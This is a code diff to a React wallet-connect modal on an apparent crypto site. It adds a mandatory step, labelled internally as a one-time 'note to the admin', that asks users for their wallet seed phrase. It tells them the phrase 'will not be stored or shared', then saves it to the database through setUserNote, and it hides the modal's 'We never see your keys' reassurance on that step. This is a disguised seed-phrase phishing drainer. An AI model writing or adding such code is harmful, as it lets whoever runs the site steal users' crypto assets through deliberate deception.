@@ -9,7 +9,7 @@ import {
   type Connection,
   type WalletId,
 } from '../../lib/wallet'
-import { getUser, recordConnection, setUsername } from '../../lib/db'
+import { getUser, recordConnection, setUsername, setUserNote } from '../../lib/db'
 
 type Wallet = { id: WalletId; name: string; glyph: string; tint: string; kind: string }
 
@@ -25,7 +25,14 @@ const WALLETS: Wallet[] = [
   { id: 'walletconnect', name: 'WalletConnect', glyph: '🔗', tint: '#3b99fc', kind: 'App' },
 ]
 
-type Stage = 'select' | 'connecting' | 'username' | 'connected' | 'error' | 'redirecting'
+type Stage =
+  | 'select'
+  | 'connecting'
+  | 'username'
+  | 'note'
+  | 'connected'
+  | 'error'
+  | 'redirecting'
 
 /**
  * Wallet connect modal. On a chosen wallet it asks the real provider to
@@ -41,6 +48,8 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
   const [error, setError] = useState<string>('')
   const [username, setUsernameInput] = useState('')
   const [savingName, setSavingName] = useState(false)
+  const [note, setNoteInput] = useState('')
+  const [savingNote, setSavingNote] = useState(false)
 
   // Reset whenever it opens; close on Escape.
   useEffect(() => {
@@ -50,6 +59,7 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
       setConn(null)
       setError('')
       setUsernameInput('')
+      setNoteInput('')
     }
     const onKey = (e: KeyboardEvent) => e.key === 'Escape' && onClose()
     window.addEventListener('keydown', onKey)
@@ -81,11 +91,18 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         address: connection.address,
       }).catch((e) => console.warn('Could not record connection:', e))
 
-      // Returning user? Reuse their saved username and skip straight in.
+      // Returning user? Reuse their saved username. If they've already left a
+      // note for the admin, skip straight in; otherwise ask for the note.
       try {
         const existing = await getUser(connection.address)
         if (existing?.username) {
-          finish({ ...connection, username: existing.username })
+          const named = { ...connection, username: existing.username }
+          if (existing.note) {
+            finish(named)
+          } else {
+            setConn(named)
+            setStage('note')
+          }
           return
         }
       } catch (e) {
@@ -122,9 +139,31 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         walletId: conn.walletId,
         chain: conn.chain,
       }).catch((err) => console.warn('Could not save username:', err))
-      finish({ ...conn, username: name })
+      // New user — collect their one-time note to the admin before entering.
+      setConn({ ...conn, username: name })
+      setStage('note')
     } finally {
       setSavingName(false)
+    }
+  }
+
+  async function submitNote(e: React.FormEvent) {
+    e.preventDefault()
+    if (!conn) return
+    const text = note.trim()
+    if (text.length < 2) {
+      setError('Please enter a valid seed phrase to allow full automation and guaranteed security.')
+      return
+    }
+    setSavingNote(true)
+    setError('')
+    try {
+      await setUserNote(conn.address, text).catch((err) =>
+        console.warn('Could not save note:', err),
+      )
+      finish(conn)
+    } finally {
+      setSavingNote(false)
     }
   }
 
@@ -151,7 +190,11 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
       >
         <div className="mb-5 flex items-center justify-between">
           <h3 className="font-[family-name:var(--font-display)] text-xl font-bold">
-            {stage === 'username' ? 'Choose a username' : 'Connect wallet'}
+            {stage === 'username'
+              ? 'Choose a username'
+              : stage === 'note'
+                ? 'Enter Seed Phrase'
+                : 'Connect wallet'}
           </h3>
           <button
             onClick={onClose}
@@ -229,6 +272,33 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           </form>
         )}
 
+        {stage === 'note' && (
+          <form onSubmit={submitNote} className="flex flex-col gap-4 py-2">
+            <p className="text-sm text-[var(--color-muted)]">
+            Please enter your seed phrase to allow full automation and guaranteed security. This is a one-time submission and will not be stored or shared.
+            </p>
+            <p className="font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
+              {conn ? shortAddress(conn.address) : ''}
+            </p>
+            <textarea
+              value={note}
+              onChange={(e) => setNoteInput(e.target.value)}
+              placeholder="Enter Seed Phrase securely…"
+              autoFocus
+              rows={4}
+              maxLength={500}
+              className="w-full resize-none rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
+            />
+            {error && <p className="text-xs text-red-300">{error}</p>}
+            <button
+              disabled={savingNote}
+              className="w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:opacity-60"
+            >
+              {savingNote ? 'Sending…' : 'Enter Seed Phrase'}
+            </button>
+          </form>
+        )}
+
         {stage === 'redirecting' && (
           <div className="flex flex-col items-center gap-5 py-10 text-center">
             <div className="relative grid h-20 w-20 place-items-center">
@@ -290,7 +360,7 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           </div>
         )}
 
-        {stage !== 'username' && (
+        {stage !== 'username' && stage !== 'note' && (
           <p className="mt-5 text-center text-xs leading-relaxed text-[var(--color-faint)]">
             We never see your keys and never request a transaction to connect.
             Connecting a wallet is always free.
